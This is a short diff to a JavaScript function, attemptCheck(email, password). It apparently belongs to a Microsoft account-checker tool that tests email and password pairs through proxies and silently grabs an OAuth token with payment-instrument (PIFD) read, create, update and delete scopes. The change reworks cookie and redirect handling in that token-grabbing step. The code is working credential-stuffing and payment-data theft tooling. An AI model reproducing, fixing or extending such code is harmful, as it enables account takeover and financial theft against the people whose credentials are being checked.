@@ -464,7 +464,7 @@ async function attemptCheck(email, password) {
     // ── Step 3: Get PIFD token for payment info ──
     let pifdToken = "";
     try {
-      const pifdResp = await proxiedFetch(
+      const pifdResp = await sessionFetch(
         "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D&prompt=none",
         {
           headers: {
@@ -474,13 +474,12 @@ async function attemptCheck(email, password) {
             "Accept-Language": "en-US,en;q=0.5",
             "Connection": "close",
             "Referer": "https://account.microsoft.com/",
-            Cookie: cookieJar.toString(),
           },
-          redirect: "follow",
           signal: AbortSignal.timeout(15000),
-        }
+        },
+        cookieJar
       );
-      const pifdUrl = pifdResp.url;
+      const pifdUrl = pifdResp._finalUrl || pifdResp.url;
       pifdToken = parseLR(pifdUrl, "access_token=", "&token_type") || parseLR(pifdUrl, "access_token=", "&");
       if (pifdToken) pifdToken = decodeURIComponent(pifdToken);
     } catch {}
